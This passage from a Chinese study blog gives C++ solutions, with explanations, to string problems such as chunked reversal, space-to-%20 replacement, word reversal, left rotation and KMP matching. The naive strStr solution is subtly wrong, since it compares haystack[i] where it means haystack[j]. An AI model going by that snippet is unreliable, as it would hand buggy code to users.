k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += (<span class="number">2</span>*k)) &#123;</span><br><span class="line">            <span class="comment">// 1. 每隔 2k 个字符的前 k 个字符进行反转</span></span><br><span class="line">            <span class="comment">// 2. 剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符</span></span><br><span class="line">            <span class="keyword">if</span> (i + k &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+i, s.<span class="built_in">begin</span>()+i+k);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 3. 剩余字符少于 k 个，则将剩余字符全部反转。</span></span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+i, s.<span class="built_in">end</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += (<span class="number">2</span> * k)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + k &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(s, i, i+k<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">reverse</span>(s, i, s.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-05-替换空格——-20"><a href="#剑指-Offer-05-替换空格——-20" class="headerlink" title="剑指 Offer 05 替换空格——%20"></a>剑指 Offer 05 替换空格——%20</h3>请实现一个函数，把字符串 s 中的每个空格替换成”%20”</li></ul><p><strong>法一：先扩容，从后向前移动</strong></p><pre><code>如果想把这道题目做到极致，就不要只用额外的辅助空间了！首先扩充数组到每个空格替换成&quot;%20&quot;之后的大小。然后从后向前替换空格，也就是双指针法，过程如下：i指向新长度的末尾，j指向旧长度的末尾。</code></pre><p><strong>很多数组填充类的问题，都可以【预先给数组扩容】待填充后的大小，然后在【从后向前操作】。</strong></p><p><img src="https://img-blog.csdnimg.cn/c9feb80fa01c4481afcde9951aea2ba8.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(n)</span></span><br><span class="line"><span class="comment">    O(1)  扩容：s.resize(s.size() + count*2);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>; <span class="comment">// 统计空格的个数</span></span><br><span class="line">        <span class="keyword">int</span> sOldSize = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 扩容：即每个空格替换成&quot;%20&quot;之后的大小</span></span><br><span class="line">        s.<span class="built_in">resize</span>(s.<span class="built_in">size</span>() + count * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">int</span> sNewSize = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 从后向前将空格替换为&quot;%20&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=sNewSize<span class="number">-1</span>, j=sOldSize<span class="number">-1</span>; j&lt;i; i--,j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                s[i] = s[j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s[i - <span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                s[i - <span class="number">2</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                i -= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>法二：额外空间</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//额外空间：string array; 使用push_back()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;     <span class="comment">//字符数组</span></span><br><span class="line">        string array;   <span class="comment">//存储结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;c : s)&#123;   <span class="comment">//遍历原字符串</span></span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                array.<span class="built_in">push_back</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151 反转字符串中的单词"></a>151 反转字符串中的单词</h3><p>给你一个字符串 s ，请你【反转字符串中 单词 的顺序】。<br>单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。<br>返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。【返回字符串，且不包括多余空格】<br>注意：输入字符串 s中可能会存在【前导空格、尾随空格或者单词间的多个空格】。<br><strong>不要使用辅助空间，空间复杂度要求为O(1)</strong></p><pre><code>1.移除多余空格2.将整个字符串反转3.将每个单词反转</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//翻转，区间写法：左闭右闭 []</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//去除所有空格并在相邻单词之间添加1空格, 快慢指针</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeExtraSpaces</span><span class="params">(string&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); ++i) &#123; </span><br><span class="line">            <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>) s[slow++] = <span class="string">&#x27; &#x27;</span>; <span class="comment">//手动控制空格，给单词之间添加空格。slow != 0说明不是第一个单词，需要在单词前添加空格。</span></span><br><span class="line">                <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123; <span class="comment">//补上该单词，遇到空格说明单词结束。</span></span><br><span class="line">                    s[slow++] = s[i++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">resize</span>(slow); <span class="comment">//slow的大小即为去除多余空格后的大小。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">removeExtraSpaces</span>(s);<span class="comment">//去空格</span></span><br><span class="line">        <span class="built_in">reverse</span>(s, <span class="number">0</span>, s.<span class="built_in">size</span>()<span class="number">-1</span>);<span class="comment">//反转整串</span></span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>; <span class="comment">//removeExtraSpaces后保证第一个单词的开始下标一定是0。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= s.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i==s.<span class="built_in">size</span>() || s[i]==<span class="string">&#x27; &#x27;</span>) &#123; <span class="comment">//到达空格或者串尾，说明一个单词结束。进行翻转。</span></span><br><span class="line">                <span class="built_in">reverse</span>(s, start, i - <span class="number">1</span>);</span><br><span class="line">                start = i + <span class="number">1</span>; <span class="comment">//更新下一个单词的开始下标start</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双端队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = s.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 去掉 【开头空格】</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s[left] == <span class="string">&#x27; &#x27;</span>) </span><br><span class="line">            ++left;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉【末尾空格】</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s[right] == <span class="string">&#x27; &#x27;</span>)    </span><br><span class="line">            --right;</span><br><span class="line">        <span class="comment">//双端队列</span></span><br><span class="line">        deque&lt;string&gt; d;</span><br><span class="line">        string word;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[left];</span><br><span class="line">            <span class="keyword">if</span> (word.<span class="built_in">size</span>() &amp;&amp; c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 将单词 push 到队列的头部</span></span><br><span class="line">                d.<span class="built_in">push_front</span>(<span class="built_in">move</span>(word));</span><br><span class="line">                word = <span class="string">&quot;&quot;</span>;<span class="comment">//再次置空</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                word += c;<span class="comment">//word存入单词</span></span><br><span class="line">            &#125;</span><br><span class="line">            ++left;</span><br><span class="line">        &#125;</span><br><span class="line">        d.<span class="built_in">push_front</span>(<span class="built_in">move</span>(word));</span><br><span class="line">        </span><br><span class="line">        string ans;</span><br><span class="line">        <span class="keyword">while</span> (!d.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ans += d.<span class="built_in">front</span>();</span><br><span class="line">            d.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">if</span> (!d.<span class="built_in">empty</span>()) </span><br><span class="line">                ans += <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-58-II-左旋转字符串"><a href="#剑指-Offer-58-II-左旋转字符串" class="headerlink" title="剑指 Offer 58 - II. 左旋转字符串"></a>剑指 Offer 58 - II. 左旋转字符串</h3><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseLeftWords</span><span class="params">(string s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        s.<span class="built_in">resize</span>(s.<span class="built_in">size</span>()+n);<span class="comment">//扩容</span></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = s.<span class="built_in">size</span>()-n;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(k&lt;n)&#123;</span><br><span class="line">            s[r] = s[l];</span><br><span class="line">            l++;</span><br><span class="line">            r++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">erase</span>(<span class="number">0</span>,n);<span class="comment">//删去 前n空间</span></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4065a87308d74e788c76a54081c6695d.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseLeftWords</span><span class="params">(string s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">begin</span>()+n);</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+n,s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="KMP算法——连续子串"><a href="#KMP算法——连续子串" class="headerlink" title="KMP算法——连续子串"></a>KMP算法——连续子串</h2><ul><li><strong>前缀表</strong>是用来回退的，它记录了<strong>模式串与主串(文本串)不匹配(发生冲突)的时候，模式串应该从哪里开始重新匹配</strong></li><li>eg: 求 最长相等前后缀 aabaaf<ul><li>【前缀】：不包含最后一个字符的所有以第一个字符开头的连续子串<ul><li>a,aa,aab,aaba,aabaa</li></ul></li><li>【后缀】：不包含第一个字符的所有以最后一个字符结尾的连续子串<ul><li>f,af,aaf,baaf,abaaf</li></ul></li><li>a:0 aa:1 aab:0 aaba:1 aabaa:2 aabaaf:0</li><li>next[]={0,1,0,1,2,0}【最长相等前后缀长度】</li></ul></li></ul><p><strong>说明：</strong><br>串：    aabaabaaf<br>模式串：aabaaf<br>依次匹配，模式串f前的字符都正确匹配，当匹配到模式串的f时，匹配有误，此时查看【前缀表】，f前一个字符a所对应的数字是2，则下一次直接从模式串下标为2的位置开始匹配，即模式串的b开始，依次匹配子串，发现匹配成功。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    初始化、处理前后缀不同情况、处理前后缀相同情况，、next数组更新</span></span><br><span class="line"><span class="comment">    i 后缀末尾位置</span></span><br><span class="line"><span class="comment">    j 前缀末尾位置</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        j=0;</span></span><br><span class="line"><span class="comment">        next[0]=0;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="28-找出字符串中第一个匹配项的下标（KMP）"><a href="#28-找出字符串中第一个匹配项的下标（KMP）" class="headerlink" title="28 找出字符串中第一个匹配项的下标（KMP）"></a>28 找出字符串中第一个匹配项的下标（KMP）</h3><p>给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串的第一个匹配项的下标（下标从 0 开始）。如果 needle 不是 haystack 的一部分，则返回 -1 。<br><strong>法一：朴素匹配</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    枚举原串 haystack 中的每个字符作为「发起点」，每次从原串的「发起点」和匹配串的「首位」开始尝试匹配：</span></span><br><span class="line"><span class="comment">    总共可能的匹配串有 (n-m) 个</span></span><br><span class="line"><span class="comment">    O((n-m)*m)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = haystack.<span class="built_in">size</span>();<span class="comment">//原串</span></span><br><span class="line">        <span class="keyword">int</span> m = needle.<span class="built_in">size</span>();<span class="comment">//子串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n-m;i++)&#123;<span class="comment">//原串中最多匹配n-m次</span></span><br><span class="line">            <span class="keyword">int</span> j=i, k=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(k&lt;m &amp;&amp; haystack[i]==needle[k])&#123;</span><br><span class="line">                j++;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k==m)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>法二：KMP算法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(string h, string need)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();<span class="comment">//原串</span></span><br><span class="line">        <span class="keyword">int</span> m = need.<span class="built_in">size</span>();<span class="comment">//子串</span></span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        h.<span class="built_in">insert</span>(h.<span class="built_in">begin</span>(),<span class="string">&#x27; &#x27;</span>);<span class="comment">//哨兵</span></span><br><span class="line">        need.<span class="built_in">insert</span>(need.<span class="built_in">begin</span>(),<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="comment">//构建 next[]数组</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">next</span><span class="params">(m+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>,j=<span class="number">0</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &amp;&amp; need[i]!=need[j+<span class="number">1</span>])</span><br><span class="line">                j = next[j];</span><br><span class="line">            <span class="keyword">if</span>(need[i]==need[j+<span class="number">1</span>])</span><br><span class="line">                j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,j=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &amp;&amp; h[i]!=need[j+<span class="number">1</span>])</span><br><span class="line">                j = next[j];</span><br><span class="line">            <span class="keyword">if</span>(h[i]==need[j+<span class="number">1</span>])</span><br><span class="line">                j++;</span><br><span class="line">            <span class="keyword">if</span>(j==m)</span><br><span class="line">                <span class="keyword">return</span> i-m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459 重复的子字符串"></a>459 重复的子字符串</h3><p>给定一个非空的字符串 s ，检查是否可以通过由它的一个子串重复多次构成。<br><strong>法一：移动匹配</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string t = s + s;</span><br><span class="line">        t.<span class="built_in">erase</span>(t.<span class="built_in">begin</span>()); t.<span class="built_in">erase</span>(t.<span class="built_in">end</span>()<span class="number">-1</span>); <span class="comment">// 掐头去尾</span></span><br><span class="line">        <span class="keyword">if</span> (t.<span class="built_in">find</span>(s) != std::string::npos) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//r</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//return (s + s).find(s, 1) != s.size();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>法二：KMP</strong><br><strong>重复的子字符串：是最长相等前后缀不包含的那个字串</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前缀表-1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span 